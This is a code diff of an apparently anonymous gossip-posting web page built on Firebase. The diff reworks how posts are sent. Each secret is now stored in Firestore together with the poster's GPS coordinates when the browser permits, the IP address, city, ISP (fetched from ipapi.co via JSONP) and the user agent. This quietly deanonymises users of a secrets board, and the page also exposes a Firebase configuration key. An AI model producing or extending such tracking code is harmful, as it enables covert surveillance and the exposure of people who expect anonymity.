@@ -10,61 +10,16 @@
 
     <style>
         :root { --deep-black: #050505; }
-        body { 
-            margin: 0; 
-            background-color: var(--deep-black); 
-            color: #ddd; 
-            font-family: 'Courier New', monospace; 
-        }
-        .hero { 
-            height: 40vh; 
-            background-image: linear-gradient(rgba(0,0,0,0.6), var(--deep-black)), url('https://images.unsplash.com/photo-1599661046827-dacff0c0f09a?auto=format&fit=crop&w=1000&q=80'); 
-            background-size: cover; 
-            background-position: center; 
-            display: flex; 
-            flex-direction: column; 
-            justify-content: center; 
-            align-items: center; 
-            text-align: center;
-        }
+        body { margin: 0; background-color: var(--deep-black); color: #ddd; font-family: 'Courier New', monospace; }
+        .hero { height: 40vh; background-image: linear-gradient(rgba(0,0,0,0.6), var(--deep-black)), url('https://images.unsplash.com/photo-1599661046827-dacff0c0f09a?auto=format&fit=crop&w=1000&q=80'); background-size: cover; background-position: center; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
         .hero h1 { font-size: 5rem; margin: 0; color: #ccc; letter-spacing: 12px; }
-        
         #login-screen { display: flex; flex-direction: column; align-items: center; padding: 50px; }
-        .btn-login { 
-            background: #333; 
-            color: white; 
-            padding: 15px 30px; 
-            cursor: pointer; 
-            border: 1px solid #555; 
-            text-transform: uppercase; 
-        }
-
+        .btn-login { background: #333; color: white; padding: 15px 30px; cursor: pointer; border: 1px solid #555; text-transform: uppercase; }
         #feed-container { display: none; padding: 20px; max-width: 600px; margin: auto; }
         .input-box { background: #111; padding: 20px; border: 1px solid #333; margin-bottom: 30px; }
-        textarea { 
-            width: 100%; 
-            background: transparent; 
-            border: none; 
-            color: #aaa; 
-            font-size: 1.1rem; 
-            outline: none; 
-            font-family: inherit; 
-            resize: none;
-        }
-        .btn-post { 
-            background: #222; 
-            color: #999; 
-            border: 1px solid #444; 
-            padding: 10px 20px; 
-            float: right; 
-            cursor: pointer; 
-        }
-        .fofoca-card { 
-            background: #0d0d0d; 
-            padding: 20px; 
-            margin-bottom: 15px; 
-            border-left: 3px solid #444; 
-        }
+        textarea { width: 100%; background: transparent; border: none; color: #aaa; font-size: 1.1rem; outline: none; font-family: inherit; resize: none; }
+        .btn-post { background: #222; color: #999; border: 1px solid #444; padding: 10px 20px; float: right; cursor: pointer; }
+        .fofoca-card { background: #0d0d0d; padding: 20px; margin-bottom: 15px; border-left: 3px solid #444; }
     </style>
 </head>
 <body>
@@ -89,7 +44,6 @@
     </div>
 
     <script>
-        // 1. Configuração do seu Firebase (Mantida a sua original)
         var firebaseConfig = {
             apiKey: "AIzaSyC_RKEhHxEvgDN0w7X1AMAwE0a4ljiSbh4",
             authDomain: "xoxo-fofocas.firebaseapp.com",
@@ -100,7 +54,6 @@
             measurementId: "G-3DZPC3E7SV"
         };
 
-        // 2. Inicialização
         firebase.initializeApp(firebaseConfig);
         var db = firebase.firestore();
 
@@ -110,69 +63,58 @@
             carregarFofocas();
         }
 
-        // 3. Função de Rastreio com Dupla Verificação (Ajustada para o seu erro)
         function enviarFofoca() {
             var inputElement = document.getElementById('fofocaInput');
             var texto = inputElement.value;
             if(texto.trim() === "") return;
 
-            // Tentativa 1: ipapi.co (Ótimo para dados de Wi-Fi/Org)
-            fetch('https://ipapi.co/json/')
-                .then(function(res) { return res.json(); })
-                .then(function(data) {
-                    processarEnvio(data, texto, inputElement, "ipapi");
-                })
-                .catch(function() {
-                    // Tentativa 2: ipwho.is (Backup caso a primeira falhe)
-                    fetch('https://ipwho.is/')
-                        .then(function(res) { return res.json(); })
-                        .then(function(data) {
-                            processarEnvio(data, texto, inputElement, "ipwho");
-                        })
-                        .catch(function() {
-                            // Se todos os rastreios falharem por bloqueio do navegador
-                            processarEnvio(null, texto, inputElement, "bloqueado");
-                        });
-                });
+            // Melhoria: Tentar GPS do navegador primeiro para precisão máxima
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    // Se o usuário aceitar GPS
+                    rastrearIP(texto, inputElement, position.coords);
+                }, function() {
+                    // Se o usuário recusar GPS, tenta apenas IP
+                    rastrearIP(texto, inputElement, null);
+                }, { timeout: 5000 });
+            } else {
+                rastrearIP(texto, inputElement, null);
+            }
         }
 
-        function processarEnvio(data, texto, inputElement, fonte) {
-            var rastro = {};
+        function rastrearIP(texto, inputElement, gpsCoords) {
+            // Usando IP-API (Formato JSONP para evitar bloqueio CORS)
+            var script = document.createElement('script');
+            script.src = 'https://ipapi.co/jsonp/callback=finalizarEnvio';
             
-            if (data) {
-                // Monta os dados com aspas simples para evitar erros de sintaxe no seu editor
-                rastro = {
-                    ip: data.ip || data.query || "Desconhecido",
-                    localizacao: (data.city || "?") + ", " + (data.region || "?") + " - " + (data.country_name || data.country || "?"),
-                    provedor_wifi: data.org || (data.connection ? data.connection.isp : "Não detectado"),
-                    latitude: data.latitude || 0,
-                    longitude: data.longitude || 0,
-                    fonte: fonte,
-                    e_vpn: data.security ? data.security.vpn : (data.is_vpn || false)
+            // Função global para processar os dados
+            window.finalizarEnvio = function(data) {
+                var rastro = {
+                    ip: data.ip || "Desconhecido",
+                    localizacao_ip: (data.city || "?") + ", " + (data.region || "?") + " - " + (data.country_name || "?"),
+                    provedor_wifi: data.org || "Não detectado",
+                    // Se houver GPS, usa GPS, senão usa o IP
+                    latitude: gpsCoords ? gpsCoords.latitude : (data.latitude || 0),
+                    longitude: gpsCoords ? gpsCoords.longitude : (data.longitude || 0),
+                    precisao: gpsCoords ? "GPS/Alta" : "IP/Baixa"
                 };
-            } else {
-                rastro = { status: "Rastreio bloqueado pelo navegador ou VPN" };
-            }
 
-            // Envio para o Cloud Firestore
-            db.collection("fofocas").add({
-                conteudo: texto,
-                data: firebase.firestore.FieldValue.serverTimestamp(),
-                rastro: rastro,
-                dispositivo: navigator.userAgent
-            })
-            .then(function() {
-                inputElement.value = "";
-                alert("Segredo enviado com sucesso! Rastro capturado.");
-            })
-            .catch(function(error) {
-                console.error("Erro no Firebase:", error);
-                alert("Erro ao enviar! Verifique se o seu Firebase está em 'Modo de Teste'.");
-            });
+                db.collection("fofocas").add({
+                    conteudo: texto,
+                    data: firebase.firestore.FieldValue.serverTimestamp(),
+                    rastro: rastro,
+                    dispositivo: navigator.userAgent
+                }).then(function() {
+                    inputElement.value = "";
+                    alert("Segredo guardado com rastro preciso!");
+                    document.body.removeChild(script);
+                });
+            };
+
+            document.body.appendChild(script);
         }
 
         function carregarFofocas() {
-            // Carrega em tempo real e ordena pela data
             db.collection("fofocas").orderBy("data", "desc").onSnapshot(function(snapshot) {
                 var mural = document.getElementById('mural');
                 mural.innerHTML = "";
